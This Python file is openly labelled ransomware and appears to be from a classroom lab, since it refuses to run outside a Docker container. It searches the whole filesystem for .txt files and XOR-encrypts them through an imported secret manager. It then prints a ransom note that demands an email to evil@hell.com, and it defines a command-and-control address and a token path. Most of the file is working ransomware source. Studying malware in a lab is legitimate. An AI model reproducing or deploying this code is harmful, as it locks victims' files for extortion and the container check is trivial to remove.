import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        """
         match the filter
        """

        # here we want all the texte files so the filter will be '*.txt'
        # the path("/") enable the function to find all the files matching the filter in the system
        path_files=Path("/")  
        files = [f for f in path_files.rglob(filter)]
        return files

    def encrypt(self):
        """
         function for encrypting (see PDF)
        """

        liste_files = self.get_files("*.txt")
        secret_manager = SecretManager()
        secret_manager.setup()
        secret_manager.xorfiles(liste_files)
        
        token_hex = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token_hex))

    def decrypt(self):
        """
         function for decrypting (see PDF)
        """

        liste_files = self.get_files("*.txt")
        secret_manager = SecretManager()

        try:
            candidate_key=input("Key : ")
            # If the key is not valid, 'set_key' raise an error 
            # which leads to the except case 
            secret_manager.set_key(candidate_key)
            secret_manager.xorfiles(liste_files)
            secret_manager.clean()
            print("All your file have been uncrypted, thank for the money ! good bye !")
        except:
            print("ERROR : The key is not correct")
        return

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()